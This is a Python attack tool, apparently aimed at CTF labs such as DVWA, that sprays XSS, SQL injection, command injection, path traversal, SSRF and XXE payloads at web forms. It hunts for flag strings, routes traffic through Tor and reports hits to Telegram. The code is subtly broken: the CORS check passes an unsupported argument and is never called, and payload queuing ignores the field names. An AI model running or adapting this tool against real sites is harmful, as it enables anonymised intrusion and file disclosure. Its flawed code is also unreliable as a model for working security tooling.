import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
from bs4 import BeautifulSoup
import re
import json
import csv
import yaml
import pandas as pd
from telegram import Bot
from urllib.parse import urljoin
import os
from datetime import datetime
import random
from fake_useragent import UserAgent
import websocket
from typing import List, Dict, Optional
from tqdm.asyncio import tqdm_asyncio

# Глобальные переменные
vuln_count = 0
results = {
    'vulnerabilities': [],
    'injections': [],
    'flags': [],
    'admin_access': [],
    'db_dumps': [],
    'contest_logs': [],
    'js_flags': [],
    'graphql': []
}

# Загрузка конфигурации из YAML
def load_config(config_path: str = 'config.yaml') -> Dict:
    default_config = {
        'xss_payloads': [
            "<script>alert('Test by W1ndY')</script>",
            "<img src=x onerror=alert('Test by W1ndY')>",
        ],
        'sqli_payloads': ["' OR '1'='1", "1' AND SLEEP(5)--"],
        'rce_payloads': ["whoami", "id"],
        'lfi_payloads': ["../config.php", "../../etc/passwd"],
        'ssrf_payloads': ["http://localhost", "http://127.0.0.1"],
        'xxe_payloads': ['<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/hosts">]><x>&x;</x>'],
        'graphql_queries': ['{__schema{types{name}}}', '{users{id,username}}'],
        'admin_paths': ["/admin", "/graphql", "/api", "/login"],
        'custom_html': "<div>W1ndY was here!</div>",
        'request_timeout': 5.0,
        'delay': 0.5,
        'max_concurrent': 10,
        'use_tor': True,
        'proxy_list': ['socks5://127.0.0.1:9050'],
        'user_agents': UserAgent().random,
        'telegram': {'bot_token': '', 'chat_id': ''},
    }
    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            config = yaml.safe_load(f)
        default_config.update(config)
    return default_config

CONFIG = load_config()

# Класс для логирования уязвимостей
class VulnerabilityLogger:
    def __init__(self, results: Dict, telegram_config: Dict):
        self.results = results
        self.telegram_config = telegram_config
        self.vuln_count = 0

    async def log_vuln(self, vuln_type: str, message: str, category: str = 'vulnerabilities'):
        self.vuln_count += 1
        self.results[category].append(message)
        print(f"\033[91m🔥 {message}\033[0m")
        self.results['contest_logs'].append(message)
        if self.telegram_config['bot_token'] and self.telegram_config['chat_id']:
            try:
                bot = Bot(token=self.telegram_config['bot_token'])
                await bot.send_message(
                    chat_id=self.telegram_config['chat_id'],
                    text=f"🔥 Найдено {self.vuln_count} уязвимостей! Последняя: {message}" if self.vuln_count % 10 == 0 else message
                )
            except Exception as e:
                print(f"\033[93m⚠ Telegram Error: {e}\033[0m")

# Класс для атак
class AttackManager:
    def __init__(self, session: aiohttp.ClientSession, logger: VulnerabilityLogger):
        self.session = session
        self.logger = logger
        self.flag_pattern = r'flag\{[A-Za-z0-9-_]+\}'

    async def async_request(self, method: str, url: str, data=None, params=None) -> Optional[aiohttp.ClientResponse]:
        try:
            async with self.session.request(
                method, url, data=data, params=params, headers={'User-Agent': CONFIG['user_agents']}, timeout=CONFIG['request_timeout']
            ) as response:
                response.text = await response.text()
                return response
        except Exception as e:
            print(f"\033[93m⚠ Request Error: {url}: {e}\033[0m")
            return None

    async def inject_payload(self, url: str, vuln_type: str, payload: str) -> bool:
        test_data = {'input': payload} if vuln_type != 'rce' else {'cmd': payload}
        response = await self.async_request('POST', url, data=test_data)
        if not response:
            return False

        vuln_detected = False
        vuln_message = None
        if vuln_type == 'xss' and payload in response.text:
            vuln_message = f"💉 XSS by W1ndY: {url} с {payload}"
            vuln_detected = True
            category = 'injections'
        elif vuln_type == 'sqli' and 'error' in response.text.lower():
            vuln_message = f"💉 SQLi by W1ndY: {url} с {payload}"
            vuln_detected = True
            category = 'injections'
        elif vuln_type == 'rce' and ('uid=' in response.text or 'pong' in response.text):
            vuln_message = f"💉 RCE Detected: {url} with {payload}"
            vuln_detected = True
            category = 'injections'
        elif vuln_type == 'lfi' and ('DB_PASSWORD' in response.text or 'root:' in response.text):
            vuln_message = f"💉 LFI Detected: {url} with {payload}"
            vuln_detected = True
            category = 'injections'
        elif vuln_type in ['ssrf', 'xxe']:
            vuln_message = f"💉 {vuln_type.upper()} by W1ndY: {url} с {payload} (Check Interact.sh for OOB)"
            vuln_detected = True
            category = 'injections'
        elif vuln_type == 'graphql' and ('__schema' in response.text or 'users' in response.text):
            vuln_message = f"💉 GraphQL Detected: {url} с {payload}"
            vuln_detected = True
            category = 'graphql'

        if vuln_detected:
            await self.logger.log_vuln(vuln_type, vuln_message, category)
            return True
        return False

    async def check_cors(self, url: str) -> None:
        headers = {
            'Origin': 'http://evil.com',
            'User-Agent': CONFIG['user_agents']
        }
        response = await self.async_request('GET', url, headers=headers)
        if response and 'Access-Control-Allow-Origin' in response.headers:
            acao = response.headers['Access-Control-Allow-Origin']
            if acao == '*' or 'evil.com' in acao:
                vuln_message = f"🌐 CORS Misconfiguration: {url} allows {acao}"
                await self.logger.log_vuln('cors', vuln_message)

# Основная функция сканирования
async def hack_website(url: str, attacks: List[str]) -> None:
    connector = ProxyConnector.from_url(CONFIG['proxy_list'][0]) if CONFIG['use_tor'] else None
    async with aiohttp.ClientSession(
        headers={'User-Agent': UserAgent().random},
        connector=connector
    ) as session:
        logger = VulnerabilityLogger(results, CONFIG['telegram'])
        attacker = AttackManager(session, logger)

        # Начальный запрос
        response = await attacker.async_request('GET', url)
        if not response:
            print("\033[91m🚨 Сайт не отвечает! Проверяй URL, W1ndY! 🚨\033[0m")
            return

        soup = BeautifulSoup(response.text, 'html.parser')

        # Поиск флагов
        flag_pattern = r'flag\{[A-Za-z0-9-_]+\}'
        for text in soup.stripped_strings:
            if re.search(flag_pattern, text):
                await logger.log_vuln('flag', f"🚩 Galactic CTF Flag: {text}", 'flags')
        for header, value in response.headers.items():
            if re.search(flag_pattern, value):
                await logger.log_vuln('flag', f"🚩 Galactic CTF Flag in Header: {header}: {value}", 'flags')
        for cookie in session.cookie_jar:
            if re.search(flag_pattern, cookie.value):
                await logger.log_vuln('flag', f"🚩 Galactic CTF Flag in Cookie: {cookie.key}: {cookie.value}", 'flags')

        # Сканирование форм
        tasks = []
        for form in soup.find_all('form'):
            action = form.get('action', '')
            form_url = urljoin(url, action)
            for vuln_type in ['xss', 'sqli', 'rce', 'lfi', 'ssrf', 'xxe']:
                if vuln_type in attacks:
                    for payload in CONFIG[f'{vuln_type}_payloads']:
                        for input_tag in soup.find_all('input'):
                            name = input_tag.get('name')
                            if name:
                                tasks.append(attacker.inject_payload(form_url, vuln_type, payload))

        # Параллельное выполнение задач
        for future in tqdm_asyncio.as_completed(tasks, desc="\033[91m🔥 W1ndY's Galactic Ultra\033[0m"):
            await future

        # Сохранение результатов
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_dir = 'shine_logs'
        os.makedirs(log_dir, exist_ok=True)

        # Экспорт в JSON
        with open(f'{log_dir}/shine_results_{timestamp}.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=4, ensure_ascii=False)

        # Экспорт в CSV
        with open(f'{log_dir}/shine_results_{timestamp}.csv', 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Type', 'Details'])
            for category, items in results.items():
                for item in items:
                    writer.writerow([category.capitalize(), item])

        # Экспорт в Excel с pandas
        df = pd.DataFrame([(k.capitalize(), v) for k, vs in results.items() for v in vs], columns=['Type', 'Details'])
        df.to_excel(f'{log_dir}/shine_results_{timestamp}.xlsx', index=False)

        print(f"\n\033[92m💾 Galactic Shine Logs: {log_dir}/shine_results_{timestamp}.json, .csv, .xlsx. W1ndY, ты пугаешь галактику! 😈\033[0m")

# Интерактивное меню
def interactive_menu() -> tuple[str, List[str]]:
    print("\033[91m🌌 Йо, W1ndY! Сияем ярче галактики! 🌟\033[0m")
    print("\n🌟 Omega Ultra Galactic Menu by W1ndY 🌟")
    url = input("URL (e.g., http://localhost/dvwa): ")
    attacks = input("Атаки (xss sqli rce lfi ssrf xxe, Enter для всех): ").lower().split() or ['xss', 'sqli', 'rce', 'lfi', 'ssrf', 'xxe']
    CONFIG['use_tor'] = input("Использовать Tor? (y/n): ").lower() == 'y'
    return url, attacks

if __name__ == "__main__":
    url, attacks = interactive_menu()
    if url:
        asyncio.run(hack_website(url, attacks))